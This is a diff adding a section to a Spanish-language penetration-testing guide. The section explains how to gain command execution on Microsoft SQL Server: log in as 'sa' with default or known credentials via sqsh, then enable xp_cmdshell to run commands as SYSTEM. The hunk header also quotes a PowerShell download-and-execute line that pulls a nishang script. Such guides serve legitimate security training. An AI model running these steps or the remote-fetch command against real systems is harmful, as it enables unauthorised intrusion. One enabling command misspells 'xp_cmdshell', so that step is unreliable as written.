@@ -1595,3 +1595,40 @@ C:\Windows\SysNative\WindowsPowerShell\v1.0\Powershell IEX(New-Object Net.WebCli
 
 Compartiendo el recurso citado de **nishang**. Si volvemos a checkear en qué proceso nos situamos, podremos ver que esta vez la consulta `[Environment]::Is64BitProcess` nos devolverá un **True**, pudiendo ya proseguir con la enumeración a nivel de sistema.
 
+#### RCE Filter Evasion Microsoft SQL
+
+El servicio **ms-sql-s** dentro de nuestro **Low Hanging Fruit** es un buen servicio a enumerar, sobre todo para saber si cuenta con credenciales por defecto. En caso de contar con credenciales por defecto, nos podemos conectar vía **sqsh** o a través del script **mssqlclient.py**, pudiendo posteriormente probar si somos capaces de utilizar la funcionalidad **xp_cmdshell**, la cual nos permite ejecutar comandos sobre el sistema.
+
+En caso de contar con credenciales válidas, podemos realizar la autenticación al servicio via **sqsh** de la siguiente forma:
+
+```bash
+sqsh -S 192.168.1.X -U sa -P superPassword
+```
+
+En caso de querer probar credenciales por defecto, como el usuario es **sa** y no posee password, simplemente omitimos el parámetro **-P**.
+
+Una vez conectados, podemos realizar las siguientes instrucciones:
+
+```bash
+1> xp_cmdshell 'whoami'
+2>go
+
+nt authority\ system
+```
+
+Puede ser que se de el caso donde tras lanzar la instrucción **go**, se nos presente un mensaje que nos avisa de que el componente está deshabilitado. Para habilitarlo, simplemente seguimos las siguientes instrucciones:
+
+```bash
+1> EXEC SP_CONFIGURE 'show advanced options', 1
+2> reconfigure
+3> go
+4> EXEC SP_CONFIGURE 'xp_cmdhshell', 1
+5> reconfigure
+6> go
+7> xp_cmdshell "whoami"
+8> go
+
+nt authority\ system
+```
+
+Y ya lograremos ejecutar comandos sobre el sistema.
